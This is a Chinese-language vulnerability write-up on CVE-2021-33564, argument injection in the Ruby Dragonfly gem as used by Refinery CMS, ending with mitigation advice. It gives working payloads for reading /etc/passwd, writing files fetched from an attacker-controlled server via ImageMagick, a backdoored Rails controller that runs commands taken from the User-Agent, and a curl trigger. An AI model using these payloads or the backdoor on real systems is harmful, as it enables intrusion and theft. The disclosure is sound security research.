CVE-2021-33564 Ruby Dragonfly 中的参数注入

介绍

在最近的一次客户参与中，我们发现Refinery CMS 的某些配置中存在参数注入漏洞。经过进一步调查，了解到该问题的根本原因存在于 Ruby Gem Dragonfly 中，它是一个流行的图像处理库，被Refinery CMS、Locomotive CMS和Alchemy CMS等多个 CMS 使用。这篇文章概述了此漏洞的技术细节、利用过程以及对用户和组织的影响。


Dragonfly Ruby Gem

Dragonfly 库允许在网站上进行图像处理，例如生成图像缩略图、文本图像或一般只管理附件。为了说明这个想法，一个用于获取图像的示例 URL 如下所示（如 Refinery CMS文档中所述）：

/system/images/W1siZiIsIjIwMTUvMDQvMjEvNjRlZ2d5MjJzcl9CdWxsd2lua2xlLmpwZyJdLFsicCIsInRodW1iIiwiMjI1eDI1NVx1MDAzZSJdXQ/Bullwinkle.jpg

然后可以将 base64 编码部分解码为：

[["f","2015/04/21/64eggy22sr_Bullwinkle.jpg"],["p","thumb","225x255\u003e"]]

这会指示 Dragonfly 应用程序首先从文件数据存储中获取指定的图像，然后将图像作为225x255缩略图提供。


漏洞发现

#1 尝试 - 本地文件包含 (LFI)

观察 base64 解码后的字符串，我们可以推断出它f并p表示采用可变数量参数的某些类型的操作。特别是，该f操作似乎执行文件操作。我们决定测试 LFI 有效载荷，例如../../及其变体。示例有效负载如下所示：

[["f","../../../../../etc/passwd"]]

但是，没有一个有效载荷起作用。为了找出原因，我们设置了一个本地 Refinery CMS 实例并为其附加了一个调试器。事实证明，有几个限制。应用程序：

  • 检查是否存在../; 和

  • 将应用程序根目录添加到该路径。

由于这些验证，LFI 的利用没有成功。


#2 尝试 - 命令注入

但是，从示例 URL 中可以看出，可用的操作比f. 通过分析Dragonfly的源代码，很清楚Dragonfly管理这些操作的方式是通过一系列工作来进行的。可提供的职位如下：

  • f: fetch

  • ff: fetch_file

  • fu: fetch_url

  • g: generate

  • p: process


该fetch作业之前已针对 LFI 进行过测试，但未成功。由于下面显示的许可名单功能，fetch_file和fetch_url作业也没有成功：

def validate_fetch_file_step!(step)  unless fetch_file_whitelist.include?(step.path)    raise JobNotAllowed, "fetch file #{step.path} disallowed - use fetch_file_whitelist to allow it"  endend
def validate_fetch_url_step!(step)  unless fetch_url_whitelist.include?(step.url)    raise JobNotAllowed, "fetch url #{step.url} disallowed - use fetch_url_whitelist to allow it"  endend

剩下的两种工作类型是generate和process。如Dragonfly文档中所述，这两种类型的作业都支持ImageMagickconvert实用程序。例如，URL的base64编码部分

/system/images/W1siZyIsICJjb252ZXJ0IiwgInRlc3QuanBnIiwgInBuZyJdXQ==

解码为以下有效负载：

[["g", "convert", "test.jpg", "png"]]

它被解释为以下 shell 命令：

convert test.jpg /tmp/dragonfly<variable_length_string>.png

我们可以看到我们能够控制命令的两个部分，即命令的第一个参数convert，以及指示文件将转换为的格式的扩展名。这表明了命令注入的可能性。


Shell 命令参数注入

最初的测试显示，指令喷射的有效载荷，例如&&，||，或$()将被阻止。原来这是由于以下代码：

def run(command, opts={})  command = escape_args(command) unless opts[:escape] == false  Dragonfly.debug("shell command: #{command}")  run_command(command)end
def escape_args(args)  args.shellsplit.map{|arg| escape(arg) }.join(' ')end
def escape(string)  Shellwords.escape(string)end

在执行命令之前，它们首先使用 Ruby Gem Shellwords 的shellsplit函数进行拆分。接下来，个别参数被转义Shellwords.escape。的escape函数被示出如下：

def shellescape(str)  str = str.to_s
  # An empty argument will be skipped, so return empty quotes.  return "''".dup if str.empty?
  str = str.dup
  # Treat multibyte characters as is.  It is the caller's responsibility  # to encode the string in the right encoding for the shell  # environment.  str.gsub!(/[^A-Za-z0-9_\-.,:+\/@\n]/, "\\\\\\&")
  # A LF cannot be escaped with a backslash because a backslash + LF  # combo is regarded as a line continuation and simply ignored.  str.gsub!(/\n/, "'\n'")
  return strend

这有效地阻止了大多数特殊字符。但是，由于shellsplit首先使用了用户输入字符串，所以我们可以使用空格或换行符来插入参数。例如，有效载荷[["g", "convert", " -help test.png", "png"]]将被解释为：

convert -help test.png /tmp/dragonfly<variable_string>.png

这允许将任意参数注入convert命令（这可能是设计使然）。但是，利用论点注入需要更多的研究。因此，我们需要深入研究 ImageMagick 的功能，找到一种方法来实现任意文件的读写。


探索 ImageMagick

ImageMagick 的一个功能是将非图像文件转换为图像。在“支持的图像格式”文档中，有ImageMagick支持的格式列表。其中一种格式rgb允许将图像作为原始RGB值读取。要使用该rgb选项，还必须提供-sizeand-depth选项。


接下来，有一个可以使用 ImageMagick 将输入文件转换为的格式列表。其中一种格式是 BMP，它既是无损又是未压缩的，因此在转换过程中不会丢失任何信息。结合这些，以下命令会将/etc/passwd文件转换为test.bmp：

convert -size <file_size>x1 -depth 8 rgb:/etc/passwd /tmp/test.bmp

要转换test.bmp回来，我们可以通过发出命令来反转操作，convert test.bmp rgb:test.out并且test.out将包含大致 相同的内容/etc/passwd。但是，如果文件大小不能完全被 3 整除，则文件的最后一到两个字节将被截断，因为 RGB 格式要求每个像素恰好三个字节。


此外，由于我们事先不知道实际文件大小，因此我们需要一些方法来找到正确的文件大小。当然，这可以通过基于相似文件的强行强制或猜测来实现。但是，如果提供的文件大小大于或小于实际文件大小，应用程序会返回不同的响应，因此可以使用二进制搜索算法。


虽然上面讨论的方法已经足够好了，但仍有更多的空间来改进这些技术。通过进一步的研究，我们发现通过指定不受支持的随机格式（例如out或）foobar，输入文件的原始内容将被复制到目标位置，而无需在实际的图像格式中进行编码。此外，由于 ImageMagick 不执行任何未知输出格式的转换，-size因此未使用实际参数，因此可以包含任何值。这消除了确定实际文件大小的需要。


文件大小需要被三整除的问题也可以绕过。代替使用rgb:，我们可以使用gray:选项将图像读取为原始的单字节灰色样本。结合这些改进，我们形成以下命令，该命令将复制/etc/passwdto的全部内容而/tmp/test.out无需编码：

convert -size 1x1 -depth 8 gray:/etc/passwd /tmp/test.out

总而言之，以下列出了我们可以通过参数注入执行的各种有用的实用程序：

  • rgb:<filename>: 读取文件作为原始 RGB 值

  • gray:<filename>：将文件读取为原始灰色样本

  • -write <output>: 将输出写入指定位置

  • -size <width>x<height>: 设置图像的宽度和高度

  • -depth <output>: 设置图像的深度

结合上述实用程序，我们可以实现任意文件读写。在某些情况下，我们也可以实现RCE。下面详细介绍开发过程。


开发

任意文件读取

我们可以使用上述技术来执行任意文件读取。如下所示的有效负载读取目标/etc/passwd文件：

[["g", "convert", "-size 1x1 -depth 8 gray:/etc/passwd", "out"]]

这将被解释为以下命令：

convert -size 1x1 -depth 8 gray:/etc/passwd /tmp/dragonfly<variable_string>.out

通过对上述有效负载进行 base64 编码，我们可以在 HTTP GET 请求中将其发送到本地 Refinery CMS 实例。以下屏幕截图显示命令执行成功：

任意文件写入

为了实现任意文件写入，我们可以先使用以下命令在本地生成一个BMP文件：

convert -size <file_size>x1 -depth 8 gray:<filename> out.bmp

接下来，需要使用某种文件上传机制将图像文件上传到 Web 服务器上的已知位置。默认情况下，Refinery CMS 在需要身份验证的管理员界面中支持此功能。但是，这可以绕过，因为 ImageMagick 支持转换由 URL 引用的图像。这有效地将此漏洞转化为预授权任意文件写入。


因此，我们可以简单地将生成的内容out.bmp托管在我们控制的服务器上。然后，我们可以发出以下有效负载：

[["g", "convert", "http://<attacker_server>/out.bmp -write gray:<target_location >", "png"]]

这将被解释为以下命令：

convert http://<attacker_server>/out.bmp -write gray:<target_location>  /tmp/dragonfly<variable_string>.out

此命令下载out.bmp我们正在使用的文件http://<attacker_server>/并将其转换回灰色样本（这将是我们的原始文件）。该-write选项还允许我们指定输出位置，从而允许将任意文件写入任何可写目录。


远程代码执行

一旦具备读写任意文件的能力，攻击者可以通过多种方式实现 RCE。下面描述一个特定于 Refinery CMS 的场景。


获得代码执行的一种方法是覆盖application_controller.rbRuby on Rails 应用程序中的 。恶意示例application_controller.rb如下所示：

class ApplicationController < ActionController::Baseinclude ApplicationHelper
    protect_from_forgery with: :exception
    before_action :http_basic_auth    layout -> { params[:controller] == "home" ? "application" : "content" }
    protected
def http_basic_auth        ua = request.env['HTTP_USER_AGENT']        idx = ua.index("zxsecurity:")if idx != nil            cmd = ua[idx+11..-1]            puts cmd            res = `#{cmd}``echo '#{res}' > public/out.txt`endreturn unless ENV["HTTP_BASIC_AUTH_USERNAME"] && ENV["HTTP_BASIC_AUTH_PASSWORD"]        authenticate_or_request_with_http_basic("Username and Password please") do |username, password|        username == ENV["HTTP_BASIC_AUTH_USERNAME"] && password == ENV["HTTP_BASIC_AUTH_PASSWORD"]endendend

这会在目标应用程序中植入一个后门，zxsecurity:以便执行通过用户代理提供的字符串后的操作系统命令，并将输出写入公开可用的目录。


从技术上讲，仅当有人重新启动服务器时，此文件更改才会触发，但是在某些情况下，目标可能正在运行Phusion Passenger。在这种情况下，如果文件<app_root>/tmp/restart.txt更新，应用程序可以自动重新启动。因此，攻击者可以先写后门application_controller.rb来<app_root>/app/controller/application_controller.rb，然后写任意内容<app_root>/tmp/restart.txt。然后服务器将使用后门重新启动，现在可以通过发出以下命令来触发：

curl -A 'zxsecurity:ls' https://<target_server>/ &>/dev/null && curl https://<target_server>/out.txt

影响的限制和分析

此漏洞有一个重要限制，即verify_urls必须明确禁用该选项。在verify_urls做以下检查：

def sha  unless app.secret    raise CannotGenerateSha  end  OpenSSL::HMAC.hexdigest('SHA256', app.secret, to_unique_s)[0,16]end

该变量to_unique_s是通过展平用户提供的 base64 编码数组并连接所有字符串而获得的字符串。此代码生成HMAC-SHA256用于验证REST请求的签名。除非可以获取应用程序秘密（即，硬编码的秘密），否则此选项从根本上缓解了此漏洞。


虽然不常见，但我们观察到一些 Web 服务器故意禁用此选项，立即使其资产易受攻击。


如何修复

确保verify_urls启用了默认的 Dragonfly选项。Dragonfly 还为所有受影响的版本发布了补丁，因此将 Dragonfly Ruby Gem 更新到 1.4.0 或更高版本可以缓解这个问题。
